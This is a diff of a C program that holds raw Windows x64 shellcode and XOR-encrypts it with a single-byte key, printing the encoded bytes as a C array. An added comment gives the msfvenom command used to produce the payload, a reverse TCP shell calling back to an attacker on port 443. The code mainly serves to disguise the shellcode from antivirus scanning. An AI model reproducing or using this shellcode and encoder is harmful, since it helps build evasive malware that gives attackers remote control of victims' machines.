@@ -4,6 +4,8 @@
 typedef unsigned char BYTE;
 typedef unsigned int SIZE_T;
 
+//msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=443 -f c
+
 unsigned char payload[] = 
 "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
 "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
@@ -48,12 +50,9 @@ void XorByOneKey(BYTE* pShellcode, SIZE_T sShellcodeSize, BYTE bKey) {
 }
 
 int main() {
-    // Example payload to encrypt
-    //BYTE payload[] = "VirtualAlloca";
-    //SIZE_T payloadSize = sizeof(payload) - 1;  // Exclude the null terminator
-    
-    //for shellcodetype
-    SIZE_T payloadSize = sizeof(payload) - 1;
+
+    //sizeof payload
+    SIZE_T payloadSize = sizeof(payload) - 1; // Exclude the null terminator
 
     // Key to use for encryption
     BYTE encryptionKey = 0x5A;  // You can change this key to any byte value
@@ -73,21 +72,6 @@ int main() {
     }
     printf("};\n");
 
-    // Decrypt the payload (for demonstration purposes)
-    XorByOneKey(payload, payloadSize, encryptionKey);
-
-    // Print the original and decrypted payload
-    printf("Original Payload: %s\n", payload);
-    
-    printf("unsigned char dencrypted_result[] = {");
-    SIZE_T k;
-    for (k = 0; k < payloadSize; k++) {
-        printf("0x%02X", payload[k]);
-        if (k < payloadSize - 1) {
-            printf(", ");
-        }
-    }
-    printf("};\n");
 
     return 0;
 }
